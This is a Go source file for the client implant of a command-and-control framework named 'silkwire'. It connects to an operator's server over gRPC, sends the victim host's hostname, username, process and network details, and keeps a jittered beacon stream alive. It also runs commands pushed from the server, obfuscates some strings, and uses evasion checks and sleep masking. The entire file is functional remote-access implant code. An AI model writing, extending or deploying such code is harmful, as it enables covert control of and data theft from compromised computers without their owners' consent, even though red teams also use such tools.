package main

import (
	"context"
	"crypto/tls"
	"fmt"
	"io"
	"log"
	mathrand "math/rand"
	"net"
	"os"
	"os/user"
	"runtime"
	"time"

	pb "silkwire/proto"
	"silkwire/shared"

	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials"
	"google.golang.org/grpc/credentials/insecure"
	"google.golang.org/grpc/keepalive"
	"google.golang.org/grpc/metadata"
	"google.golang.org/grpc/peer"
)

// logDebug logs debug messages if DebugMode is enabled
func logDebug(msg string) {
	if DebugMode {
		log.Println(msg)
	}
}

// Implant represents the core implant functionality
type Implant struct {
	ID           string
	SessionToken string
	ServerAddr   string
	RemoteAddr   string
	client       pb.C2ServiceClient
	conn         *grpc.ClientConn
	retryCount   int32

	// Configuration
	BeaconInterval int32
	JitterPercent  int32
}

// NewImplant creates a new implant instance
func NewImplant(serverAddr string) *Implant {
	return &Implant{
		ID:             shared.GenerateImplantID(),
		ServerAddr:     serverAddr,
		RemoteAddr:     "unknown",
		BeaconInterval: BeaconInterval,
		JitterPercent:  JitterPercent,
	}
}

// Connect establishes connection to the C2 server using appropriate transport
func (i *Implant) Connect() error {
	// Create context with long timeout for persistent connections
	ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
	defer cancel()

	var conn *grpc.ClientConn
	var err error

	// Configure keepalive parameters for long-term connection persistence
	kacp := keepalive.ClientParameters{
		Time:                10 * time.Second, // Send pings every 10 seconds if no activity
		Timeout:             5 * time.Second,  // Wait 5 seconds for ping ack before considering connection dead
		PermitWithoutStream: true,             // Send pings even when no active RPCs
	}

	// Check transport type to determine connection method
	if TransportType == "HTTP" {
		// For HTTP transport, use insecure connection (no TLS)
		conn, err = grpc.DialContext(ctx, i.ServerAddr,
			grpc.WithTransportCredentials(insecure.NewCredentials()),
			grpc.WithKeepaliveParams(kacp),
			grpc.WithBlock(), // Wait for connection to be ready
		)
	} else if TransportType == "HTTPS" {
		// For HTTPS transport, use TLS without client certificates
		// Use same TLS settings as mTLS for consistency (required for stable gRPC streams)
		config := &tls.Config{
			MinVersion: tls.VersionTLS12,
			MaxVersion: tls.VersionTLS12,
			CipherSuites: []uint16{
				tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
			},
		}

		// Configure server certificate verification
		if SkipTLSVerify {
			config.InsecureSkipVerify = true
		} else {
			// For HTTPS, use system CAs for server verification
			// No need for custom CA certificates
		}

		creds := credentials.NewTLS(config)

		conn, err = grpc.DialContext(ctx, i.ServerAddr,
			grpc.WithTransportCredentials(creds),
			grpc.WithKeepaliveParams(kacp),
			grpc.WithBlock(), // Wait for connection to be ready
		)
	} else {
		// For mTLS transport, use TLS with client certificates
		// Get CA-signed client certificate
		clientCert, err := GetClientCertificate()
		if err != nil {
			return fmt.Errorf("failed to get client cert: %v", err)
		}

		// Create TLS config with Sliver-like settings for mTLS
		config := &tls.Config{
			Certificates: []tls.Certificate{clientCert},
			// Use Sliver-like TLS settings
			MinVersion: tls.VersionTLS12,
			MaxVersion: tls.VersionTLS12,
			CipherSuites: []uint16{
				tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
			},
			CurvePreferences: []tls.CurveID{
				tls.CurveP384,
			},
		}

		// Configure server certificate verification for mTLS
		if SkipTLSVerify {
			config.InsecureSkipVerify = true
		} else {
			// Use CA certificate for server verification
			caCertPool, err := GetCACertPool()
			if err != nil {
				return fmt.Errorf("failed to get CA certificate pool: %v", err)
			}
			if caCertPool != nil {
				config.RootCAs = caCertPool
			} else {
				// Fallback to system CAs if no embedded CA
				config.InsecureSkipVerify = SkipTLSVerify
			}
		}

		creds := credentials.NewTLS(config)

		conn, err = grpc.DialContext(ctx, i.ServerAddr,
			grpc.WithTransportCredentials(creds),
			grpc.WithKeepaliveParams(kacp),
			grpc.WithBlock(), // Wait for connection to be ready
		)
	}

	if err != nil {
		return fmt.Errorf(deobfStr("grpc_dial")+": %v", err)
	}

	i.conn = conn
	i.client = pb.NewC2ServiceClient(conn)
	return nil
}

// Register registers the implant with the C2 server
func (i *Implant) Register() error {
	// Gather system information
	hostname, _ := os.Hostname()
	currentUser, _ := user.Current()
	username := "unknown"
	if currentUser != nil {
		username = currentUser.Username
	}

	// Get network interfaces
	interfaces, _ := net.Interfaces()
	var ifaceNames []string
	for _, iface := range interfaces {
		if iface.Flags&net.FlagUp != 0 && iface.Flags&net.FlagLoopback == 0 {
			ifaceNames = append(ifaceNames, iface.Name)
		}
	}

	req := &pb.RegistrationRequest{
		ImplantId:         i.ID,
		Hostname:          hostname,
		Username:          username,
		Os:                runtime.GOOS,
		Arch:              runtime.GOARCH,
		ProcessName:       os.Args[0],
		Pid:               int32(os.Getpid()),
		NetworkInterfaces: ifaceNames,
		ImplantVersion:    "2.0.0-silkwire",
	}

	resp, err := i.client.Register(context.Background(), req)
	if err != nil {
		return fmt.Errorf(deobfStr("reg_fail")+": %v", err)
	}

	if !resp.Success {
		return fmt.Errorf(deobfStr("reg_reject")+": %s", resp.Message)
	}

	i.SessionToken = resp.SessionToken
	i.BeaconInterval = resp.BeaconInterval
	i.JitterPercent = resp.JitterPercent

	if DebugMode {
		log.Printf("Registration successful. Session token: %s", i.SessionToken[:8]+"...")
	}
	return nil
}

// getJitteredSleep calculates a jittered sleep duration
func (i *Implant) getJitteredSleep() time.Duration {
	base := time.Duration(i.BeaconInterval) * time.Second
	if i.JitterPercent == 0 {
		return base
	}

	// Calculate jitter
	jitterRange := float64(base) * float64(i.JitterPercent) / 100.0
	jitter := (mathrand.Float64() - 0.5) * 2 * jitterRange

	total := float64(base) + jitter
	if total < 0 {
		total = float64(base)
	}

	return time.Duration(total)
}

// createAuthContext creates an authenticated context for gRPC calls
func (i *Implant) createAuthContext() context.Context {
	md := metadata.New(map[string]string{
		"session-token": i.SessionToken,
		"implant-id":    i.ID,
		"listener-id":   ListenerID,
		"session-key":   SessionKey,
	})
	return metadata.NewOutgoingContext(context.Background(), md)
}

// StartBeaconStream starts the bidirectional beacon stream with retry logic
func (i *Implant) StartBeaconStream() error {
	baseRetryDelay := 5 * time.Second
	maxRetryDelay := 60 * time.Second
	currentDelay := baseRetryDelay

	for {
		ctx := i.createAuthContext()
		stream, err := i.client.BeaconStream(ctx)
		if err != nil {
			i.retryCount++
			if DebugMode {
				log.Printf("Failed to start beacon stream (attempt %d): %v, retrying in %v", i.retryCount, err, currentDelay)
			}
			time.Sleep(currentDelay)
			// Exponential backoff with cap
			currentDelay = time.Duration(float64(currentDelay) * 1.5)
			if currentDelay > maxRetryDelay {
				currentDelay = maxRetryDelay
			}
			continue
		}

		if p, ok := peer.FromContext(stream.Context()); ok {
			i.RemoteAddr = p.Addr.String()
		}

		// Reset retry count and delay on successful connection
		i.retryCount = 0
		currentDelay = baseRetryDelay

		// Send initial beacon
		initialBeacon := &pb.BeaconMessage{
			ImplantId:    i.ID,
			SessionToken: i.SessionToken,
			Timestamp:    time.Now().Unix(),
			Type:         pb.BeaconMessage_HEARTBEAT,
			Payload:      []byte(deobfStr("stream_estab") + " - " + TransportType),
		}

		if err := stream.Send(initialBeacon); err != nil {
			if DebugMode {
				log.Printf("Failed to send initial beacon: %v, reconnecting...", err)
			}
			time.Sleep(currentDelay)
			continue
		}

		if DebugMode {
			log.Println("Beacon stream established with transport:", TransportType)
		}

		// Start heartbeat routine with recovery
		heartbeatDone := make(chan struct{})
		go i.heartbeatLoopWithRecovery(stream, heartbeatDone)

		// Handle incoming commands - loop until stream breaks
		streamActive := true
		for streamActive {
			cmd, err := stream.Recv()
			if err == io.EOF {
				if DebugMode {
					log.Println(deobfStr("stream_closed") + " - reconnecting...")
				}
				close(heartbeatDone)
				streamActive = false
				continue
			}
			if err != nil {
				if DebugMode {
					log.Printf("Stream receive error: %v, reconnecting...", err)
				}
				close(heartbeatDone)
				streamActive = false
				continue
			}

			if DebugMode {
				log.Printf("Received command: %s", cmd.Command)
			}
			go i.ExecuteCommand(stream, cmd)
		}

		// Brief delay before reconnecting
		time.Sleep(baseRetryDelay + time.Duration(mathrand.Intn(5))*time.Second)
	}
}

// heartbeatLoop maintains the heartbeat with the server
func (i *Implant) heartbeatLoop(stream pb.C2Service_BeaconStreamClient) {
	ticker := time.NewTicker(i.getJitteredSleep())
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			// Perform evasion checks before each beacon
			if !i.PerformEvasionChecks() {
				os.Exit(0)
			}

			beacon := &pb.BeaconMessage{
				ImplantId:    i.ID,
				SessionToken: i.SessionToken,
				Timestamp:    time.Now().Unix(),
				Type:         pb.BeaconMessage_HEARTBEAT,
				Payload:      []byte(deobfStr("alive")),
			}

			if err := stream.Send(beacon); err != nil {
				if DebugMode {
					log.Printf(deobfStr("beacon_fail")+": %v", err)
				}
				return
			}

			// Reset ticker with new jittered interval and sleep masking
			sleepDuration := i.getJitteredSleep()
			ticker.Reset(sleepDuration)

			// Use sleep masking if enabled
			if SleepMask {
				go ApplySleepMask(sleepDuration / 2) // Partial masking
			}
		}
	}
}

// heartbeatLoopWithRecovery maintains the heartbeat with the server and handles graceful shutdown
func (i *Implant) heartbeatLoopWithRecovery(stream pb.C2Service_BeaconStreamClient, done <-chan struct{}) {
	ticker := time.NewTicker(i.getJitteredSleep())
	defer ticker.Stop()

	for {
		select {
		case <-done:
			return
		case <-ticker.C:
			// Perform evasion checks before each beacon
			if !i.PerformEvasionChecks() {
				os.Exit(0)
			}

			beacon := &pb.BeaconMessage{
				ImplantId:    i.ID,
				SessionToken: i.SessionToken,
				Timestamp:    time.Now().Unix(),
				Type:         pb.BeaconMessage_HEARTBEAT,
				Payload:      []byte(deobfStr("alive")),
			}

			if err := stream.Send(beacon); err != nil {
				return // Exit heartbeat loop on error, let main loop handle recovery
			}

			// Reset ticker with new jittered interval and sleep masking
			sleepDuration := i.getJitteredSleep()
			ticker.Reset(sleepDuration)

			// Use sleep masking if enabled
			if SleepMask {
				go ApplySleepMask(sleepDuration / 2) // Partial masking
			}
		}
	}
}

// StartPolling implements fallback polling mode
func (i *Implant) StartPolling() error {
	for {
		// Perform evasion checks
		if !i.PerformEvasionChecks() {
			os.Exit(0)
		}

		// Sleep with jitter and masking
		sleepDuration := i.getJitteredSleep()
		ApplySleepMask(sleepDuration)

		// Check for tasks
		ctx := i.createAuthContext()
		var p peer.Peer
		resp, err := i.client.GetTasks(ctx, &pb.TaskRequest{
			ImplantId:    i.ID,
			SessionToken: i.SessionToken,
		}, grpc.Peer(&p))

		if err != nil {
			if DebugMode {
				log.Printf("Failed to get tasks (attempt %d): %v", i.retryCount+1, err)
			}
			i.retryCount++
			// For persistent mode, we continue retrying indefinitely
			// Add some delay before retrying
			time.Sleep(time.Duration(5+mathrand.Intn(10)) * time.Second)
			continue
		}

		if i.RemoteAddr == "unknown" && p.Addr != nil {
			i.RemoteAddr = p.Addr.String()
		}

		// Reset retry count on successful communication
		i.retryCount = 0

		// Execute each task
		for _, task := range resp.Tasks {
			if DebugMode {
				log.Printf("Executing task: %s (type: %v)", task.Command, task.Type)
			}

			// Use the unified ExecuteTask function
			output, execErr := i.ExecuteTask(task)

			// Submit result
			result := &pb.TaskResult{
				ImplantId:   i.ID,
				TaskId:      task.TaskId,
				Success:     execErr == nil,
				Output:      output,
				CompletedAt: time.Now().Unix(),
			}

			if execErr != nil {
				result.Error = execErr.Error()
			}

			_, err := i.client.SubmitResult(ctx, result)
			if err != nil && DebugMode {
				log.Printf("Failed to submit result: %v", err)
			}
		}
	}
}

// Close closes the connection to the C2 server
func (i *Implant) Close() error {
	if i.conn != nil {
		return i.conn.Close()
	}
	return nil
}
